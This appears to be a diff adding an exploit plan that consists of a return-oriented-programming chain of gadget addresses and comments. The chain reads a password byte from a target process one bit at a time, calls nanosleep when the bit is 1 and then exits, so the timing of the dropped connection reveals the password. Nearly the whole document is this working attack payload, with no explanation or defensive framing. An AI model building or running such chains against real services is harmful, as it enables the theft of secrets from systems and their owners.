@@ -1,0 +1,63 @@
+# Add offset to hit return address
+
+
+0x000000000003be88 : pop rax ; ret
+ADDR_OF_CURR_BYTE_IN_PWD
+0x000000000011b528 : mov rax, qword ptr [rax] ; ret
+0x0000000000037d23 : push rax ; ret
+0x0000000000033923 : pop rcx ; ret
+0x00000000001637a5 : and ecx, 0xff ; sub eax, ecx ; ret
+0x0000000000031ab3 : push rcx ; ret
+0x000000000003be88 : pop rax ; ret
+0x0000000000033923 : pop rcx ; ret
+NUM_OF_BITS_TO_SHIFT_BY
+0x00000000000fef6b : shr eax, cl ; and eax, 1 ; ret
+
+# Now curr bit is in eax
+
+# put large number in rax if 1, else put 0 in rax
+0x000000000002590f : pop rsi ; ret
+NULL
+0x0000000000023796 : pop rdi ; ret
+0xFFFFFFFFFFFFFFFF
+0x00000000000fb80b : shl eax, 0x20 ; and rax, rdi ; or rax, rsi ; ret
+0x0000000000037d23 : push rax ; ret
+0x0000000000033923 : pop rcx ; ret
+0x0000000000093d68 : add rax, rcx ; ret
+0x0000000000037d23 : push rax ; ret
+0x0000000000033923 : pop rcx ; ret
+0x0000000000093d68 : add rax, rcx ; ret
+0x0000000000037d23 : push rax ; ret
+0x0000000000033923 : pop rcx ; ret
+0x0000000000093d68 : add rax, rcx ; ret
+0x0000000000037d23 : push rax ; ret
+0x0000000000033923 : pop rcx ; ret
+0x0000000000093d68 : add rax, rcx ; ret
+
+
+# wait for long time, if bit is 1, using syscall nanotime_clock
+0x0000000000023796 : pop rdi ; ret
+NULL
+0x0000000000037d23 : push rax ; ret
+0x00000000000fbd1d : pop rdx ; ret
+0x000000000003be88 : pop rax ; ret
+162
+0x00000000000550da : syscall ; ret
+
+# syscall exit_group
+0x0000000000023796 : pop rdi ; ret
+NULL
+0x000000000003be88 : pop rax ; ret
+231
+0x00000000000550da : syscall ; ret
+
+
+
+=> IF connection lost quickly, bit is 0
+   IF connection not lost quickly, bit is 1
+
+
+
+
+
+
